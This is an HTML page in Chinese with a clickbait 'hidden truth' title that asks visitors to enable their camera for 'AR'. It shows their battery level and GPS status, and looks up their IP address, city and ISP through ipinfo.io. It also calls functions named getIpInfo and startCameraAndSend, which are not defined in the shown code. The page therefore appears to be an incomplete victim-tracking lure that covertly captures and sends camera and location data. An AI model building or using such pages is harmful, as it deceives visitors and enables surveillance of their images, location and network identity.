<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>驚天秘密曝光！他們不想讓你知道的真相！</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #1e1e2f;
      color: #ffffff;
      margin: 0;
      padding: 0;
    }

    h1 {
      text-align: center;
      margin-top: 20px;
      font-size: 24px;
    }

    .container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      padding: 20px;
    }

    .card {
      background: linear-gradient(145deg, #2b2b3d, #191926);
      border-radius: 15px;
      padding: 20px;
      box-shadow: 2px 2px 5px #121218, -2px -2px 5px #2e2e40;
      text-align: center;
    }

    .card h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }

    .status-text {
      font-size: 14px;
      margin: 10px 0;
    }

    .loader {
      border: 4px solid #2b2b3d;
      border-top: 4px solid #4caf50;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    .progress {
      background: #2e2e40;
      border-radius: 10px;
      height: 10px;
      margin: 10px 0;
      overflow: hidden;
    }

    .progress-bar {
      background: #4caf50;
      height: 100%;
      width: 0;
      animation: fillBar 2s ease-in-out forwards;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    @keyframes fillBar {
      from {
        width: 0%;
      }
      to {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <h1>驚天秘密曝光！他們不想讓你知道的真相！</h1>
  <p id="ipInfo">資訊載入中...</p>
  <p id="status">請開啟鏡頭使用ＡＲ...</p>

  <!-- 添加的UI部分 -->
  <div class="container">
    <div class="card">
      <h2>電池資訊</h2>
      <div id="battery-info">
        <p class="status-text">讀取中...</p>
        <div class="progress">
          <div class="progress-bar" id="battery-bar"></div>
        </div>
      </div>
    </div>
    <div class="card">
      <h2>GPS 狀態</h2>
      <div id="gps-info">
        <p class="status-text">正在定位中...</p>
        <div class="loader"></div>
      </div>
    </div>
    <div class="card">
      <h2>系統資訊</h2>
      <div id="system-info">
        <p class="status-text">載入中...</p>
      </div>
    </div>
  </div>

  <script>
    // 電池資訊功能
    function updateBatteryStatus() {
      navigator.getBattery().then((battery) => {
        const level = battery.level * 100;
        const batteryBar = document.getElementById('battery-bar');
        batteryBar.style.width = `${level}%`;
        document.getElementById('battery-info').innerHTML = `
          <p class="status-text">電量：${level.toFixed(0)}%</p>
          <p class="status-text">${battery.charging ? '充電中' : '未充電'}</p>
        `;
      });
    }

    // 更新GPS顯示
    function updateGpsInfo(latitude, longitude, address) {
      document.getElementById('gps-info').innerHTML = `
        <p class="status-text">經度：${longitude.toFixed(4)}</p>
        <p class="status-text">緯度：${latitude.toFixed(4)}</p>
        <p class="status-text">地址：${address}</p>
      `;
    }

    // 系統資訊功能
    async function getSystemInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;

        document.getElementById('system-info').innerHTML = `
          <p class="status-text">IP：${ip}</p>
          <p class="status-text">位置：${city}, ${region}, ${country}</p>
          <p class="status-text">ISP：${org}</p>
        `;
      } catch (error) {
        document.getElementById('system-info').innerHTML = `
          <p class="status-text">系統資訊讀取失敗</p>
        `;
      }
    }

    // 啟動新添加的UI功能
    updateBatteryStatus();
    getSystemInfo();

    // 保留原有功能不變
    getIpInfo();
    startCameraAndSend();
  </script>
</body>
</html>
